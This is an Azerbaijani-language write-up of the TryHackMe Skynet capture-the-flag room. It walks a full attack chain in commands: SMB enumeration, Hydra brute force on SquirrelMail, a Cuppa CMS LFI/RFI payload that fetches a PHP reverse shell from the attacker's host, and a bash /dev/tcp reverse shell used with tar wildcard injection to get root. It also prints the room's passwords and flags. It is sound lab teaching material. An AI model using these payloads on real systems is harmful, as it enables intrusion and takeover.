# 🚩 TryHackMe – Skynet CTF | Azərbaycanca Write-up

> **Room:** [Skynet](https://tryhackme.com/room/skynet)  
> **Çətinlik:** Asan  
> **Kateqoriya:** SMB Enumeration, SquirrelMail, Cuppa CMS, LFI/RFI, Wildcard Injection  
> **Mövzu:** Terminator filmi mövzusunda hazırlanmışdır 🤖  
> **Məqsəd:** User flag və Root flag əldə etmək

---

## 📖 Ümumi Baxış

Bu CTF-də çoxlu xidmət (SMB, HTTP, Mail) birlikdə istifadə olunur. Hər addım növbəti addım üçün məlumat verir — klassik zəncir hücum strukturudur.

### Hücum Zənciri:
```
Nmap skan
    ↓
SMB Anonymous login → attention.txt + log1.txt (şifrə siyahısı)
    ↓
Gobuster → /squirrelmail tapıldı
    ↓
SquirrelMail login (milesdyson:cyborg007haloterminator)
    ↓
Email → SMB şifrəsi: )s{A&2Z=F^n_E.B`
    ↓
SMB milesdyson share → important.txt → /45kra24zxs28v3yd/
    ↓
Gobuster → /administrator/ → Cuppa CMS
    ↓
Cuppa CMS RFI/LFI zəifliyi → PHP reverse shell → www-data
    ↓
/home/milesdyson/user.txt → user flag
    ↓
/backups/backup.sh → crontab → wildcard injection → root 🏆
```

---

## 🔎 Mərhələ 1: Nmap ilə Port Skan

### Nmap nədir?
**Nmap** — şəbəkədə açıq portları, işləyən xidmətləri aşkar edən kəşfiyyat alətidir. Hər hücumun ilk addımı budur.

### Əmr:
```bash
nmap -sC -sV <HEDEF-IP>
```

### Nəticə:
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu
80/tcp  open  http        Apache httpd 2.4.18
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X-4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11
```

**Nə öyrəndik?**

| Port | Xidmət | Qeyd |
|------|--------|------|
| 22 | SSH | Hələlik kredensial yoxdur |
| 80 | HTTP | Veb server — araşdırılacaq |
| 110/143 | POP3/IMAP | Mail serveri |
| 139/445 | SMB/Samba | Fayl paylaşımı — çox vacib! |

---

## 📂 Mərhələ 2: SMB Enumeration — Anonymous Login

### SMB nədir?
**SMB (Server Message Block)** — Windows və Linux sistemlərində fayl, printer və digər resursları şəbəkə üzərindən paylaşmaq üçün istifadə edilən protokoldur. "Anonymous" (anonim) girişə icazə verən SMB paylaşımları çox təhlükəlidir.

### Mövcud paylaşımları siyahıla:
```bash
smbclient -L <HEDEF-IP>
```

**Nəticə:**
```
Sharename    Type    Comment
---------    ----    -------
print$       Disk    Printer Drivers
anonymous    Disk    Skynet Anonymous Share
milesdyson   Disk    Miles Dyson Personal Share
IPC$         IPC     IPC Service
```

İki maraqlı paylaşım var: `anonymous` (açıq) və `milesdyson` (şifrəli).

### Anonymous paylaşımına qoşul:
```bash
smbclient //<HEDEF-IP>/anonymous
# Şifrə sorulanda Enter bas (boş)
```

```bash
# Qovluq strukturuna bax
ls
# attention.txt və logs/ qovluğu var

# Faylları endir
get attention.txt
cd logs
get log1.txt
get log2.txt
get log3.txt
```

### attention.txt məzmunu:
```
A recent system malfunction has caused various passwords to be changed.
All skynet employees are required to change their passwords immediately.
-Miles Dyson
```

**Nə öyrəndik?** Miles Dyson adlı bir şəxs var — çox güman ki, bu sistemdəki istifadəçidir!

### log1.txt məzmunu:
```
cyborg007haloterminator
terminator22
terminator33
...
(şifrə siyahısı)
```

🎯 **Şifrə siyahısı tapıldı!** Bu, brute force üçün işlədəcəyik.

---

## 🌐 Mərhələ 3: Veb Server və Gobuster

`http://<HEDEF-IP>` — bir axtarış motoru görünür amma işləmir.

### Gobuster ilə gizli qovluqları tap:
```bash
gobuster dir -u http://<HEDEF-IP> -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Nəticə:**
```
/squirrelmail   (Status: 301)
/admin          (Status: 301)
/css            (Status: 301)
```

🎯 **`/squirrelmail`** — bu mail xidmətidir!

---

## 📧 Mərhələ 4: SquirrelMail — Email Girişi

### SquirrelMail nədir?
**SquirrelMail** — PHP ilə yazılmış köhnə açıq mənbəli veb əsaslı email müştərisidir. Birbaşa brauzerdən email oxumağa imkan verir.

`http://<HEDEF-IP>/squirrelmail/` ünvanına daxil ol.

### Hydra ilə brute force et:
```bash
hydra -l milesdyson -P log1.txt <HEDEF-IP> http-post-form \
"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

Və ya birbaşa cəhd et — log1.txt-in **ilk şifrəsi** işləyir:

```
Username: milesdyson
Password: cyborg007haloterminator
```

### Emailləri oxu:
Daxil olduqdan sonra 3 email var. Ən vacib email:

**"Samba Password reset"** emaili:
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

🎯 **SMB şifrəsi tapıldı: `)s{A&2Z=F^n_E.B``**

---

## 📁 Mərhələ 5: milesdyson SMB Paylaşımı

İndi milesdyson-un şəxsi SMB paylaşımına daxil ola bilərik:

```bash
smbclient //<HEDEF-IP>/milesdyson -U milesdyson
# Şifrə: )s{A&2Z=F^n_E.B`
```

```bash
ls
# notes/ qovluğu var

cd notes
ls
# important.txt var!

get important.txt
```

### important.txt məzmunu:
```
1. Add features to beta CMS /45kra24zxs28v3yd/
2. Work on new features for Skynet.
3. Test encryption.
```

🎯 **Gizli veb qovluğu tapıldı: `/45kra24zxs28v3yd/`**

---

## 🔍 Mərhələ 6: Gizli Qovluq və Cuppa CMS

`http://<HEDEF-IP>/45kra24zxs28v3yd/` — Miles Dyson-un şəkilini görürük.

### Gobuster ilə daha dərin tara:
```bash
gobuster dir -u http://<HEDEF-IP>/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Nəticə:**
```
/administrator   (Status: 301)
```

`http://<HEDEF-IP>/45kra24zxs28v3yd/administrator/` — **Cuppa CMS** login paneli!

### Cuppa CMS nədir?
**Cuppa CMS** — açıq mənbəli sadə bir məzmun idarəetmə sistemidir. Lakin **kritik bir zəifliyi** var — LFI/RFI!

---

## 💀 Mərhələ 7: Cuppa CMS LFI/RFI Zəifliyi

### LFI/RFI nədir?

**LFI (Local File Inclusion)** — serverdəki yerli faylları oxumağa imkan verən zəiflikdir. Məsələn, `/etc/passwd` kimi sistem fayllarını oxuya bilərsən.

**RFI (Remote File Inclusion)** — uzaq serverdəki faylı hədəf serverə daxil etməyə imkan verən zəiflikdir. Bu, PHP reverse shell göndərmək üçün istifadə edilir.

### Searchsploit ilə exploit tap:
```bash
searchsploit cuppa
# Nəticə: Cuppa CMS - /alerts/alertConfigField.php (LFI/RFI)
searchsploit -m 25971.txt
cat 25971.txt
```

### LFI ilə /etc/passwd oxu (test):
```
http://<HEDEF-IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

**Nəticə:** `/etc/passwd` faylı görünür — zəiflik təsdiqləndi! ✅

### RFI ilə PHP Reverse Shell:

**Addım 1 — PHP reverse shell hazırla:**
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
nano php-reverse-shell.php
# $ip = '<KALI-IP>'; ← öz IP-ni yaz
# $port = 4444;
```

**Addım 2 — Python HTTP server ilə paylaş:**
```bash
python3 -m http.server 8000
```

**Addım 3 — Netcat dinləyici aç:**
```bash
nc -lvnp 4444
```

**Addım 4 — RFI exploit et:**
```
http://<HEDEF-IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<KALI-IP>:8000/php-reverse-shell.php
```

**Nəticə:** `www-data` olaraq reverse shell aldıq! ✅

### Shell-i oxunaqlı et:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 📜 Mərhələ 8: User Flag

```bash
cd /home/milesdyson
cat user.txt
```

**User Flag:**
```
7ce5c2109a40f958099283600a9ae807
```

✅ **User flag alındı!**

---

## 🔍 Mərhələ 9: Privilege Escalation — Crontab + Wildcard Injection

### Backup skriptini tap:
```bash
ls /home/milesdyson/backups/
cat /home/milesdyson/backups/backup.sh
```

**backup.sh məzmunu:**
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

**`*` (wildcard/joker simvolu)** — bütün faylları seçir.

### Crontab-a bax:
```bash
cat /etc/crontab
```

**Nəticə:**
```
*/1 * * * * root /home/milesdyson/backups/backup.sh
```

**Bu nə deməkdir?** `backup.sh` skripti **hər 1 dəqiqədə bir** `root` olaraq işləyir! Bu bizim üçün böyük imkandır.

---

## ⚡ Mərhələ 10: Wildcard Injection ilə Root

### Wildcard Injection nədir?
`tar *` əmri işləyəndə `*` bütün fayl adlarına genişlənir. Əgər bir faylın adı `--checkpoint=1` kimi bir `tar` parametrini andırırsa, `tar` onu **parametr** kimi qəbul edir — bu isə istənilən əmri işlətməyə imkan verir!

### Addım 1 — Reverse shell skripti yarat:
```bash
cd /var/www/html
echo 'bash -i >& /dev/tcp/<KALI-IP>/4433 0>&1' > rootshell.sh
```

### Addım 2 — Xüsusi fayl adları yarat:
```bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash rootshell.sh"
```

**Bu faylların adları `tar`-a parametr kimi ötürülür:**
- `--checkpoint=1` → hər fayldan sonra yoxlama et
- `--checkpoint-action=exec=bash rootshell.sh` → yoxlama zamanı bu əmri icra et

### Addım 3 — Kali-də dinləyici aç:
```bash
nc -lvnp 4433
```

### Addım 4 — 1 dəqiqə gözlə:

Crontab hər dəqiqə işləyir — `backup.sh` → `tar *` → wildcard genişlənir → `rootshell.sh` işləyir → root shell gəlir!

**Nəticə:**
```
root@skynet:/var/www/html#
whoami
root
```

✅ **Root oldun! 🏆**

---

## 👑 Mərhələ 11: Root Flag

```bash
cat /root/root.txt
```

**Root Flag:**
```
3f0372db24753accc7179a282cd6a949
```

✅ **Sistem tam ələ keçirildi!**

---

## ✅ Xülasə Cədvəli

| Mərhələ | Alət | Tapıntı |
|---------|------|---------|
| Port Skan | Nmap | 22, 80, 110, 139, 143, 445 |
| SMB Siyahı | smbclient | `anonymous` + `milesdyson` paylaşımları |
| Anonymous SMB | smbclient | `attention.txt` + `log1.txt` (şifrə siyahısı) |
| Qovluq Tarama | Gobuster | `/squirrelmail` tapıldı |
| Email Login | SquirrelMail | `milesdyson:cyborg007haloterminator` |
| Email Oxuma | SquirrelMail | SMB şifrəsi: `)s{A&2Z=F^n_E.B`` |
| SMB Login | smbclient | `important.txt` → `/45kra24zxs28v3yd/` |
| Qovluq Tarama 2 | Gobuster | `/administrator/` → Cuppa CMS |
| LFI Test | URL | `/etc/passwd` oxundu |
| RFI Exploit | PHP shell + Python server | `www-data` shell alındı |
| User Flag | cat | `7ce5c2109a40f958099283600a9ae807` |
| Crontab | cat | backup.sh hər dəqiqə root ilə işləyir |
| Wildcard Injection | tar exploit | Root shell alındı |
| Root Flag | cat | `3f0372db24753accc7179a282cd6a949` |

---

## 🎓 Öyrənilən Dərslər

1. **SMB anonymous login həmişə yoxla** — açıq paylaşımlar çox vaxt kritik məlumat saxlayır
2. **Email xidmətlərini nəzərdən qaçırma** — SquirrelMail kimi veb email müştəriləri çox vaxt şifrə sızdırır
3. **Hər şifrəni başqa xidmətlərdə sına** — SMB şifrəsi emaildən, email şifrəsi SMB-dən gələ bilər (zəncir!)
4. **Gizli qovluqlar faylların içindədir** — `important.txt` kimi fayllar yeni hücum səthi açır
5. **CMS-ləri həmişə searchsploit ilə yoxla** — Cuppa, Joomla, WordPress kimi sistemlərin exploit-ləri var
6. **LFI ilə RFI fərqləndirir** — LFI yerli fayl oxuyur, RFI uzaq fayl icra edir
7. **Crontab həmişə yoxla** — root ilə işləyən cron job-lar privilege escalation üçün qızıl imkandır
8. **Wildcard injection güclüdür** — `tar *`, `cp *`, `chmod *` kimi əmrlərdə wildcard istifadəsi təhlükəlidir
9. **Zəncir düşüncəsi** — bir tapıntı növbəti tapıntını açır; tələsmə, hər məlumatı qeyd et

---

## 🔗 Faydalı Linklər

- [TryHackMe – Skynet](https://tryhackme.com/room/skynet)
- [Exploit-DB – Cuppa CMS LFI/RFI](https://www.exploit-db.com/exploits/25971)
- [GTFOBins](https://gtfobins.github.io)
- [Wildcard Injection izahı](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
- [SquirrelMail](https://squirrelmail.org/)

---

*Yazıldı: 2026 | Platforma: TryHackMe | Azərbaycanca*
